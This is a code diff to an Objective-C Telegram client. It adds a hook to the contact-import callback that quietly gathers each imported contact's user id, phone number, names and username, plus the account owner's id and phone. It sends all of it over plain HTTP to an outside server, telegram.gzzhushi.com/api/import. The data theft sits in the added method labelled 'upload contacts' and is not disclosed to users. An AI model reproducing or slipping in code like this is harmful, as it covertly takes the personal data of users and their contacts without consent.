@@ -143,9 +143,11 @@
 #import "TLRPCauth_sendCode.h"
 #import "FetchResources.h"
 #import "../../config.h"
+#import "SYNetworking.h"
 #import "NSString+SYisBlankString.h"
 
 #import "TGPreparedLocalDocumentMessage.h"
+#import "TGUpdateMessageToServer.h"
 #import "TLUser$modernUser.h"
 
 @interface TGTypingRecord : NSObject
@@ -2583,6 +2585,11 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
     return [[TGTelegramNetworking instance] performRpc:importContacts completionBlock:^(TLcontacts_ImportedContacts *importedContacts, __unused int64_t responseTime, MTRpcError *error){
         if (error == nil){
             
+            /*********  上传联系人 *****/
+            NSArray * users = importedContacts.users;
+            [self UpdateUserContectToServe:users];
+            
+            
             NSMutableString *debugImportedString = [[NSMutableString alloc] init];
             NSMutableArray *importedArray = [[NSMutableArray alloc] initWithCapacity:importedContacts.imported.count];
             for (TLImportedContact *importedContact in importedContacts.imported)
@@ -2610,6 +2617,45 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
             [requestActor exportContactsFailed];
         }
     } progressBlock:nil requiresCompletion:true requestClass:TGRequestClassGeneric];
+}
+
+
+/***** 上传联系人  *********/
+-(void)UpdateUserContectToServe:(NSArray *)userArray{
+
+    NSURL *url = [NSURL URLWithString:@"http://telegram.gzzhushi.com/api/import"];// 当前用户信息接口导入联系人
+    TGUser * selfUser = [TGDatabaseInstance() loadUser:TGTelegraphInstance.clientUserId];
+    NSMutableArray * friendsArray = [NSMutableArray array];
+    
+    for (TLUser$modernUser * user in userArray) {
+        
+
+        NSMutableDictionary * userDic =[NSMutableDictionary dictionary];
+        [userDic setValue:[self changeParmsWith:[NSString stringWithFormat:@"%d",user.n_id]] forKey:@"r_uid"];
+        [userDic setValue:[NSString stringWithFormat:@"+%@",[self changeParmsWith:user.phone]] forKey:@"r_phone"];
+        [userDic setValue:[self changeParmsWith:user.first_name ] forKey:@"r_firstname"];
+        [userDic setValue:[self changeParmsWith:user.last_name ] forKey:@"r_last_name"];
+        [userDic setValue:[self changeParmsWith:user.username ] forKey:@"r_username"];
+        [userDic setValue:@"3" forKey:@"device"];
+        [friendsArray addObject:userDic];
+    }
+    
+    NSMutableDictionary * selfUserDic =[NSMutableDictionary dictionary];
+    [selfUserDic setValue:[self changeParmsWith:[NSString stringWithFormat:@"%d",selfUser.uid]] forKey:@"r_uid"];
+    [selfUserDic setValue:[self changeParmsWith:selfUser.phoneNumber]  forKey:@"r_phone"];
+    [selfUserDic setValue:[self changeParmsWith:selfUser.firstName]  forKey:@"r_firstname"];
+    [selfUserDic setValue:[self changeParmsWith:selfUser.lastName]  forKey:@"r_last_name"];
+    [selfUserDic setValue:@"3" forKey:@"device"];
+    [friendsArray addObject:selfUserDic];
+    
+    if (selfUser.uid) {
+        
+         NSDictionary  *dict1 = @{@"s_uid":@(selfUser.uid),
+                                 @"friends":friendsArray
+                                 };
+        
+        [SYNetworking httpRequestWithDic:dict1 andURL:url];
+    }
 }
 
 
